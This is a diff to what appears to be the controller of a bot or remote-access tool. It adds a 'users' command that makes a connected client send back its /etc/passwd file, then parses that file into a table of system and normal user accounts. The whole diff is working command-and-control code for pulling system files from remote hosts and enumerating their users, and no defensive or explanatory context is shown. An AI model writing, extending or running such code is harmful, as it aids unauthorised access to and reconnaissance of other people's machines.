@@ -106,10 +106,83 @@ def session(conn):
 				return
 		elif 'help' in command:
 			helpbot()
+
 		elif 'status' in command:
-			clientstatus(conn,command)
+			try:
+				clientstatus(conn,command)
+			except:
+				conn.close()
+				remove(conn)
+				return
+
+		elif 'users' in command:
+			try:
+				userlist(conn)
+			except:
+				conn.close()
+				remove(conn)
+				return
+
+
 		else:
 			print("INVALID COMMAND PRESS HELP FOR MORE INFO")
+
+
+
+
+
+def userlist(conn):
+	try:
+		conn.send("grab*/etc/passwd".encode())
+		path=os.getcwd()+'/'+'temppasswd'
+		f=open(path,'w')
+		bits=conn.recv(1024).decode()
+		while True:
+			f.write(bits)
+			bits=conn.recv(1024).decode()
+			if bits.endswith("DONE"):
+				f.write(bits.strip("DONE"))
+				f.close()
+				break
+	except:
+		os.remove(path)
+		return
+
+	f=open(path,'r')
+	line=f.readlines()
+	usertable=PrettyTable(['Username','UID','HomeDirectory','Shell'])
+	print("\n1. For System Users")
+	print("2. For Normal Users")
+	print("Any Key to go back")
+	print("-----------------------")
+	option=input("Option>")
+	if option.isdigit():
+		option=int(option)
+	else:
+		f.close()
+		os.remove(path)
+		return
+
+	for i in line:
+		a=i.split(":")
+		a.pop(4)
+		a.pop(3)
+		a.pop(1)
+		if option ==1:
+			if int(a[1])<1000:
+				usertable.add_row(a)
+		if option ==2:
+			if int(a[1])>=1000:
+				usertable.add_row(a)
+	if option == 1 or option == 2:
+		print(usertable)
+		f.close()
+		os.remove(path)
+	else:
+		f.close()
+		os.remove(path)
+		return
+
 
 
 
